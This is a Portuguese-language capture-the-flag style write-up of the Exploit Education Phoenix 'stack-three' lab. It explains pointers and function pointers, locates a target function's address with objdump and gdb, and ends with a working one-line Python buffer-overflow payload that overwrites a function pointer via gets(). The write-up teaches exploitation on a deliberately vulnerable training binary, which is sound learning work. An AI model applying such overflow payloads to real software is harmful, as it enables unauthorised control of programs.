Index
1. [üéØ Objetivo](https://github.com/0xturazzi/Writeups/blob/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/4%20-%20Stack%20Three.md#-objetivo)
2. [üí° Dica](https://github.com/0xturazzi/Writeups/blob/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/4%20-%20Stack%20Three.md#-dica)
3. [üí´ Explica√ß√£o](https://github.com/0xturazzi/Writeups/blob/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/4%20-%20Stack%20Three.md#-explica√ß√£o)
4. [üî• Solu√ß√£o](https://github.com/0xturazzi/Writeups/blob/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/4%20-%20Stack%20Three.md#-solu√ß√£o)


# üéØ Objetivo
Usar um pointer para retornar para uma fun√ß√£o pre existente

# üí° Dica
OBS: em Ingles! -> [Wikipedia Pointer](https://en.wikipedia.org/wiki/Pointer_(computer_programming))

# üí´ Explica√ß√£o
  - O que raios s√£o pointers
  - Function pointers
  - Exploit
  
### ‚ÜóÔ∏è‚ÜòÔ∏è O que raios s√£o pointers
> Pointers s√£o uma estrutura que, ao inv√©s de armazenar dados, armazena o endere√ßo de outra estrutura.
Lembra do exemplo do po√ßo? Que cada item tinha seu endere√ßo na stack! Ent√£o, um pointer armazena esse endere√ßo! :D

O pointer pode ser visto como uma placa na estrada, indicando que X cidade est√° em Y dire√ß√£o.

![Imagem da wikipedia mostrando um pointer](https://github.com/0xturazzi/Writeups/blob/master/ExploitEducation-Phoenix-PT-BR-%20%F0%9F%87%A7%F0%9F%87%B7/img/pointer.png)
Colunas: Nome da Variavel | Endere√ßo | conte√∫do

A vari√°vel "a" √© um pointer que armazena a localiza√ß√£o da variavel "b". Coloquialmente se diz que: "a" est√° apontando para "b" (seta vermelha).
> "a" armazena uma referencia √° "b" !

> "a" pode ser des-referenciada, isto √©: Seguir a dire√ß√£o que "a" aponta, para chegar no valor de "b" ! :D

Normalmente, o caractere "&" indica uma refer√™ncia, e o caractere "*" desreferencia aquele pointer.

> Caso voc√™ tente desrefenciar um pointer que n√£o aponta pra nada (NULL), o programa vai interromper a execu√ß√£o e soltar uma mensagem de erro!

### ü¶Ä Function Pointers
> Function pointers, ao env√©s de armazenar o endere√ßo de uma vari√°vel, armazenam o endere√ßo de uma fun√ß√£o! :D

Sim! Fun√ß√µes tamb√©m s√£o armazenadas na Stack, e possuem seu endere√ßo! Esse endere√ßo pode ser encontrado por varios m√©todos:
```
objdump -d <programa> | grep <nome_da_fun√ß√£o>


gdb <programa>
  (gdb)> info functions
```
Os dois metodos ser√£o demonstrados em breve! :D

### üî• Exploit
> Buffer overflow, alterarando o valor de um function pointer, redirecionando a execu√ß√£o do programa.
> 
>Em lingua n√£o nerd, por favor? :P
> 
> Escrever fora do valor do buffer. O valor que sera corrompido indica aonde a execu√ß√£o do programa esta indo. Se controlamos esse valor, controlamos aonde o programa vai!

#### üõ∏ Analisando o programa
```
fun√ß√£o complete_level() {   -> a fun√ß√£o que a gente quer chamar
.......
}

fun√ß√£o main() {
  criar buffer[64]
  criar fp -> um function pointer
  
  fp = NULL -> vai ser usado para checar se ele foi alterado,
                se continuar sendo NULL, quer dizer que esta intacto.
                
  
  gets(buffer) -> fun√ß√£o INSEGURA para abrir um input, salva o valor no buffer
  
  if (fp) {    -> se fp foi alterado
    fp()   -> chama o endere√ßo salvo em fp como se fosse uma fun√ß√£o
  } else {
    print(valor nao alterado, tente novamente)
  }
  
  exit
}
```

N√≥s queremos chamar complete_level(), para isso, faremos fp salvar o seu endere√ßo.

E n√≥s j√° sabemos como exploitar um gets()! Ent√£o t√° na hora do trabalho!

#### üè† Encontrando o endere√ßo da fun√ß√£o
```
objdump -d    -> Resumindo, printa pro terminal os objetos armazenados na Stack e seus endere√ßos
                  ( O -d √© pra ativar a disassembly: Converter de machine code para algo legivel )!
gdb
```

objdump
```
user@phoenix-amd64:~$ objdump -d /opt/phoenix/amd64/stack-three | grep complete_level
000000000040069d <complete_level>:
```

gdb
```
user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-three                
---- Mensagens padr√£o foram removidas ----
(gdb) info functions 
All defined functions:

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004d0  printf@plt
0x00000000004004e0  gets@plt
0x00000000004004f0  puts@plt
0x0000000000400500  fflush@plt
0x0000000000400510  exit@plt
0x0000000000400520  __libc_start_main@plt
0x0000000000400530  _start
0x0000000000400546  _start_c
0x0000000000400570  deregister_tm_clones
0x00000000004005a0  register_tm_clones
0x00000000004005e0  __do_global_dtors_aux
0x0000000000400670  frame_dummy
0x000000000040069d  complete_level              -> Mesmo endere√ßo
0x00000000004006b5  main
0x0000000000400740  __do_global_ctors_aux
0x0000000000400782  _fini
```

> O endere√ßo da fun√ß√£o √© 0x000000000040069d ! :D
Presta aten√ß√£o na quantidade de null bytes que precedem o endere√ßo. Todo pointer come√ßa com pelo menos dois null bytes, 
e strings terminam com null byte!
Impedindo atacantes (n√≥s), de definir um pointer novo. N√≥s precisamos usar um que j√° esta na memoria! (  Spoiler hehehehe :D  )

Como nesse desafio o pointer ja definido e n√≥s s√≥ vamos dar um valor para ele, n√£o precisamos nos preocupar com isso,
 dado que os zeros que ficam na stack quando ela esta vazia completar√£o o endere√ßo pra gente!

#### üòê Cansei de teoria eu quero exploit

Se voc√™ quer tentar por conta propria, agora √© sua hora de brilhar!
```
Lembretes: Little Endian, o buffer tem 64 bytes, b"\x", o input vem pelo gets(), python > python3
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
eai, brilhou? ;)
```

b"A"*64     # encher o buffer

b"\x9d\x06\x40" # 0x40069d vira "9d 06 40" em LE


Espero que voc√™ tenha gostado! :D

# üî• Solu√ß√£o
```
user@phoenix-amd64:~$ python -c "print(b'A'*64 + b'\x9d\x06\x40')" | /opt/phoenix/amd64/stack-three 
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```
